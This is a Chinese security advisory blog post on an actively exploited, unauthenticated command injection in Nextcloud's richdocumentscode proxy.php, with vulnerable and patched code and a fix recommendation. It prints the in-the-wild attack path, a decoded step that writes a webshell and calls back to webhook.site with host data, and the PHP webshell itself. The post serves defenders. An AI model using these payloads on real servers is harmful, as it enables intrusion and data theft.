#  【漏洞预警】Nextcloud 已有服务器被写入后门  
YGnight
                    YGnight  night安全   2026-10-16 00:10  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LAQpgdWQSctVS8Ps0NsFTqMiasz8uDibcvoib0spt17ORFYGT7Lk8y0JElHpWukiczXboIicO8mrOUut0DwfE4PvMwpuReeibS0yQHqN8Tictdm4Z4/640?wx_fmt=png&from=appmsg "")  
  
## 一、漏洞描述  
  
richdocumentscode 是 Nextcloud 上的 Collabora 内置 CODE 服务器应用，把 Collabora 的 AppImage 下载到本机，由 PHP 直接拉起。  
  
proxy.php 夹在 Nextcloud 和本机的 coolwsd 中间，是个转发的口子。  
  
编辑文档的请求都从这过。  
  
带 ?status 的请求不用登录。这时候本机 9983 端口连不上，pidfile 里也没有活进程，proxy.php 就会走 startCoolwsd() 把服务拉起来。重启之后正好落在这个状态。  
  
启动命令里拼了一个 remote_font_config.url，值取自请求的 Host 和路径。这一串攻击者说了算。  
  
官方定性是 OS 命令注入，编号 CWE-78。  
  
CVSS 4.0 打 9.2，向量 AV:N/AC:L/AT:P/PR:N/UI:N，机密性、完整性、可用性三项都记 High。攻击不要任何权限，用户也不用配合。  
  
受影响的是 26.4.303 之前的 richdocumentscode，修在 26.4.303，公告编号 GHSA-F97P-R72Q-64H2。  
  
MITRE 10 月 14 日收录这条 CVE，描述里写明 9 月和 10 月已经有人在野利用。失陷报告里，应用目录下出现了 shx 开头的 PHP 文件。  
  
官方同时说明，这条与 2025 年的 CVE-2025-66208 是两个独立的问题。  
  
不受影响的部署官方也列清楚了。只装 richdocuments、不装这个内置应用的没事，Collabora 用 Docker、发行版包或者托管服务的也没事。  
  
触发还要求站点走 HTTPS。remote_font_config.url 只在 HTTPS 下才会拼出来，CVSS 的 Attack Requirements 记 Present 说的就是这个。  
<table><tbody><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">CVE 编号</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">CVE-2026-110447</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">公告编号</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">GHSA-F97P-R72Q-64H2</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">漏洞类型</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">OS 命令注入，CWE-78</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">影响组件</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">Nextcloud 应用 richdocumentscode 的 proxy.php，仅内置 CODE 部署</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">受影响版本</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(220, 38, 38);font-weight: bold;"><section><span leaf="">26.4.303 之前的全部版本，报告中的样本为 26.4.302</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">修复版本</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(146, 64, 14);font-weight: bold;"><section><span leaf="">26.4.303</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">触发前提</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">CODE 服务未在运行，站点为 HTTPS</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">利用条件</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">无需认证，一个 GET 请求即可触发</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">危害面</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">以 Web 服务账号执行命令，在应用目录落 PHP webshell</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">CVSS</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">9.2，CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">在野利用</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">MITRE 记录 9 月、10 月已在野利用，有实际入侵与 webshell 样本，未进 CISA KEV 目录</span></section></td></tr><tr><th style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);text-align: left;font-weight: bold;color: rgb(26, 26, 26);background-color: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">EPSS</span></section></th><td style="padding: 10px 12px;border: 1px solid rgb(209, 213, 219);color: rgb(51, 51, 51);"><section><span leaf="">1.225%，FIRST 68 百分位</span></section></td></tr></tbody></table>## 二、漏洞原理  
  
请求是怎么走到启动命令这一步的。  
  
startCoolwsd() 里，remote_font_config.url 的值是 https:// 加上 HTTP_HOST，再接上 REQUEST_URI，中间用正则把 richdocumentscode 开头到结尾的一段换成 richdocuments/settings/fonts.json。REQUEST_URI 整个来自访问者发的 URL，路径里有什么都会原样进去。  
  
// proxy.php 26.4.302 startCoolwsd()  
  
$remoteFontConfigUrl = escapeshellarg(  
  
    "https://" . $_SERVER['HTTP_HOST']  
  
    . preg_replace("/richdocumentscode.*$/",  
  
        "richdocuments/settings/fonts.json",  
  
        $_SERVER['REQUEST_URI']));  
  
$remoteFontConfig = "--o:remote_font_config.url=" . $remoteFontConfigUrl;  
  
  
$launchCmd = "bash -c \"( $appImage $remoteFontConfig $IPv4only  
  
    $lok_allow --pidfile=$pidfile || $appImage --appimage-extract-and-run ...  
  
    ) >/dev/null & disown\"";  
  
exec($launchCmd, $output, $return);  
  
但整条命令又是按 bash -c 加一对双引号拼出来的。双引号里面，URL 外面那层单引号只是普通字符，命令替换照旧求值。  
  
URL 本身过了 escapeshellarg，按说该被单引号护住。  
  
于是请求路径里的 $(...) 在 exec 把命令交给 shell 的那一刻就被执行了。  
  
官方论坛的说法一致，问题出在内置应用用 PHP exec 去拉 Collabora 的这个方式上，命令终究要过 shell。  
  
公开报告里捞到的载荷长这样。  
  
// 公开报告中的请求路径  
  
/x$(x=$(echo${IFS}<base64 载荷>|base64${IFS}-d|sh))x/%2e%2e/  
  
apps/richdocumentscode/proxy.php?status  
  
  
// base64 解码后的内容  
  
echo <webshell 的 base64>|base64 -d>shrf4645.php  
  
curl -skm 20 https://webhook.site/<回跳 id>/rf4645.$(uname -a|base64|tr -d '\n'|tr +/ -_|tr -d =)  
  
  
// 落盘的 webshell  
  
<?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2>&1');  
  
巧思在包裹的方式上。最外层那层 $() 里是个赋值，赋值不产生输出，整段替换展开成空字符串。URL 里剩下一对空片，%2e%2e 再把路径拨回 apps/richdocuments/settings/fonts.json。  
  
载荷跑完，coolwsd 拿到手的还是个正常字体配置地址，服务照常起。进程列表里看不出异常。  
  
webshell 本身走 GET 参数 c，命令交给 shell_exec，返回值直接吐回响应。  
  
多个失陷报告里，文件名都是 sh 加五位随机字符。攻击者随后用它翻找密码库文件和加密货币钱包。  
  
26.4.303 的改法是把内层命令先拼完整，整体过一遍 escapeshellarg，再交给 bash -c。  
  
// proxy.php 26.4.303 startCoolwsd()  
  
$innerCmd = "( $appImage $remoteFontConfig $IPv4only $lok_allow --pidfile=$pidfile  
  
    || $appImage --appimage-extract-and-run $remoteFontConfig $IPv4only  
  
    $lok_allow --pidfile=$pidfile) >/dev/null & disown";  
  
$launchCmd = "bash -c " . escapeshellarg($innerCmd);  
  
exec($launchCmd, $output, $return);  
  
外层 shell 看到的是一个单引号包起来的整体，不再解析里面的内容。到了内层 bash 手里，URL 外面那层单引号终于恢复正常工作，$(...) 变成 URL 里的死字。  
  
同样的载荷再打一次，命令不会执行，这串字符只是被当成一个奇怪的字体配置地址传给 AppImage。维护方确认过，升级后进程列表里仍可能出现这串字符，不会有实际执行。  
  
以上按 26.4.302 源码推导，两种拼法的引号行为在本机用相同结构模拟复现。  
## 三、修复建议  
  
装了内置 CODE 的，把 richdocumentscode 升到 26.4.303 或更高  
## 近期值得重点关注的漏洞预警  
  
[【紧急漏洞预警】nacos爆出权限绕过漏洞，可以创建管理员账户，经过分析有点出处（已复现，exp脚本已编写）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486343&idx=1&sn=b67c4eb02c03af9c3b206b1241ff7e9c&scene=21#wechat_redirect)  
  
  
[【紧急漏洞预警】GitLab整数溢出导致RCE漏洞(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486505&idx=1&sn=b424220b3cbdc1f7cbcdd7b4d1ae6da5&scene=21#wechat_redirect)  
  
  
[【漏洞预警】AnyDesk Linux存在堆缓冲区溢出漏洞(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486500&idx=1&sn=fb8fdf3dd59e252bf04360dfabac5a3c&scene=21#wechat_redirect)  
  
  
[【漏洞预警】macOS爆出路径穿越漏洞CVE-2026-84568(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486490&idx=1&sn=1009bcc6cb5416474ffa0a4f499bf67a&scene=21#wechat_redirect)  
  
  
[PostgreSQL爆出远程代码执行漏洞(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486480&idx=1&sn=31416416494b366dc85cf4d20e0ab3ee&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Atlassian八款产品爆任意文件读取漏洞(附POC)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486475&idx=1&sn=3c669c88388236c2af996ceb9782e928&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Joomla视频画廊扩展存在SQL注入漏洞(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486469&idx=1&sn=6146142b1b0095532a2d87dcbcf738df&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Roundcube网页邮件客户端存在SQL注入漏洞(附POC)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486464&idx=1&sn=93e0df392b292c72408f2c33cfb868ca&scene=21#wechat_redirect)  
  
  
[WordPress页面模板存在文件包含漏洞(POC已公开)CVE-2026-87902](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486459&idx=1&sn=5dc658a83a772526773f3e87b1ac8ad0&scene=21#wechat_redirect)  
  
  
[WordPress插件Forminator未认证短代码执行漏洞(poc已公开)CVE-2026-92229](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486454&idx=1&sn=64894c978fbfac86c914945580147bd9&scene=21#wechat_redirect)  
  
  
[WordPress插件Authorizer存在权限提升漏洞(POC已公开)CVE-2026-81294](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486449&idx=1&sn=20a4f9a399ae34e07a27c7b6d2049e45&scene=21#wechat_redirect)  
  
  
[WordPress插件MStoreAPI存在认证绕过漏洞(POC已公开)CVE-2026-13447](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486444&idx=1&sn=a22077edeab35852d6791825ebba8b10&scene=21#wechat_redirect)  
  
  
[CakePHP爆出SQL注入漏洞(POC已公开)CVE-2026-77635](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486439&idx=1&sn=5030655c1d40e179369ab972ddd5dfc9&scene=21#wechat_redirect)  
  
  
[Node.js模块proxy-addr爆出严重漏洞CVE-2026-90711](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486429&idx=1&sn=fc1772f8703bdd4128ac829c1ae8b371&scene=21#wechat_redirect)  
  
  
[Langflow爆出代码执行漏洞CVE-2026-17633  (POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486424&idx=1&sn=0fec55e718cb9fb60eb91ca24307fd1a&scene=21#wechat_redirect)  
  
  
[Apache CVE-2026-42536，补它只用一行，洞龄十四年](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486419&idx=1&sn=393b6baeea4f624ffa8440058c0d324e&scene=21#wechat_redirect)  
  
  
[【紧急】搜狗输入法爆出远程代码执行漏洞CVE-2026-51990  ，已被在野利用](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486413&idx=1&sn=0b2c6a470a165f288873fa6bace1d77b&scene=21#wechat_redirect)  
  
  
[【紧急】无需登录就能获取 GitLab 的任意文件数据(附POC)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486408&idx=1&sn=06f47231a649e03866f9e9524b5469a4&scene=21#wechat_redirect)  
  
  
[【紧急】JumpServer堡垒机被公布Access Key泄露漏洞，可以实现提权](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486403&idx=1&sn=8e4dc6a684e95b9dc5871b1aca487a57&scene=21#wechat_redirect)  
  
  
[Spring Cloud Azure公布严重漏洞 无需任何权限即可取得登录会话](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486398&idx=1&sn=c64f6f82f75da584d032b99509ffc726&scene=21#wechat_redirect)  
  
  
[【漏洞POC已公开】Linux RDS 爆出提权漏洞 一块内存放两次，root就到手了](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486393&idx=1&sn=629bab1cc81fbee25e8e6dd558ee155b&scene=21#wechat_redirect)  
  
  
[Tenda光猫爆出严重漏洞，目前无补丁(POC已公布](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486388&idx=1&sn=eb210feb27b85439b53b10e595f7667e&scene=21#wechat_redirect)  
  
  
[13 行补丁，堵住Linux能拿 root 的内核洞(EXP已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486383&idx=1&sn=a87059fbbca283a7bd64ad78280ed00a&scene=21#wechat_redirect)  
  
  
[48 字节，换走一台 Windows 的 SYSTEM(CVE-2026-62735漏洞POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486378&idx=1&sn=f9e17fe32b6a3c67249fb4f037a3f1c6&scene=21#wechat_redirect)  
  
  
[【漏洞预警】linux删个网桥就能提权root？目前没有补丁(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486373&idx=1&sn=5f8bb9b0ff7c9fad75a8071c026b9f93&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Linux三年前补上的洞，又一次被挖开了](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486368&idx=1&sn=337dc5fa148d0b24e7dbd352a71e184f&scene=21#wechat_redirect)  
  
  
[【情报】支付宝8.2亿数据泄露？给同事说一声，别自己吓自己](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486362&idx=1&sn=927fdf3d81c79a2ff8871086f0e78a8b&scene=21#wechat_redirect)  
  
  
[【漏洞预警】自己注册个号，就能搬空别人的 Magento 订单和支付卡（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486363&idx=1&sn=344a1f2e1a64b3b3be1509610edd2a0d&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Next.js 爆出新漏洞，不用登录实现命令执行(POC已公开)](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486348&idx=1&sn=350cb257c3bfc3372e2dd50f2eb13738&scene=21#wechat_redirect)  
  
  
[【漏洞补丁绕过预警】Redis CVE-2026-23479变种高危漏洞，EXP已公开](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486299&idx=1&sn=7d1d8a95dad56cb021c2aa4ff549ee62&scene=21#wechat_redirect)  
  
  
[【漏洞补丁绕过】超 30 万 WordPress 站点受影响，Forminator 文件上传漏洞（附POC）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486304&idx=1&sn=a22d6632366218b72fd68b3a5cb91557&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Exchange爆出RCE漏洞，利用Exchange 帮另一台 Exchange 开门（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486323&idx=1&sn=124dd54f863f64371f18c668d52e1fab&scene=21#wechat_redirect)  
  
  
[【漏洞预警】不用登录，一个请求就能让 GeoServer 乖乖执行命令（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486318&idx=1&sn=b478f775998b89579c53d4e0fbdc8c6e&scene=21#wechat_redirect)  
  
  
[【漏洞预警】Keycloak不登录就能接管任意账户，双重验证也拦不住](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486309&idx=1&sn=d5c1a812f00448d397d3e3a8e78cdd45&scene=21#wechat_redirect)  
  
  
[【漏洞预警】 8月WebLogic公布了9个漏洞，有一个需要重点关注](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486294&idx=1&sn=eb26bc5f8fcafc9ab402b77acdb1b2a4&scene=21#wechat_redirect)  
  
  
[【漏洞预警】近期MongoDB 公布了5个漏洞，最严重的一个可以不认证、远程就能拿下你电脑](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486289&idx=1&sn=10023bdd570d9f011eef242a23f83bb6&scene=21#wechat_redirect)  
  
  
[【0DAY漏洞】 全球5G手机芯片厂商之一‌的紫光展锐SOC存在RCE漏洞，影响数十家手机厂商，还未发布补丁](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486279&idx=1&sn=5e1452f6984bf3d4b4d35a2240676df5&scene=21#wechat_redirect)  
  
  
[【漏洞告警】安卓 14 到 16 全中招，通讯录 SQL 注入漏洞正在抄家（POC已公开）](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486274&idx=1&sn=4bacf56f2045fca36b7b3de4be3ae591&scene=21#wechat_redirect)  
  
  
[【漏洞预警】紧急排查，SMB服务再曝新漏洞，利用脚本已公开](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486251&idx=1&sn=633ed2b7d916bcf98404a7b3a9a8c4b4&scene=21#wechat_redirect)  
  
  
[【漏洞预警】不用输密码，对方已经接管你的Mac：官方补丁公布macOS存在未鉴权RCE漏洞](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486246&idx=1&sn=eaf0c51686e92e89826098fcf51fb959&scene=21#wechat_redirect)  
  
  
[【0day漏洞预警】MariaDB 13 爆 9.8 分 RCE 链：最低 USAGE 权限就能远程执行命令](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486225&idx=1&sn=bd13754fd9378e01a088cf996fa5b557&scene=21#wechat_redirect)  
  
  
[VMware 爆 5 个洞，两个 9.8 不用密码就能打穿 vCente](https://mp.weixin.qq.com/s?__biz=MzU5MTc1NTE0Ng==&mid=2247486204&idx=1&sn=2590e283b0981541da74647ddc817282&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LAQpgdWQSctTWicwicwovsVtMLAjYPfEB9lMRmJJiaIozWIuicwrbneXZ3pGly4lRNAd1WrP6AKYA925Iz4c1EbnMLCOqWzkCmdCLXDQibsG4VQw/640?wx_fmt=png&from=appmsg "")  
  
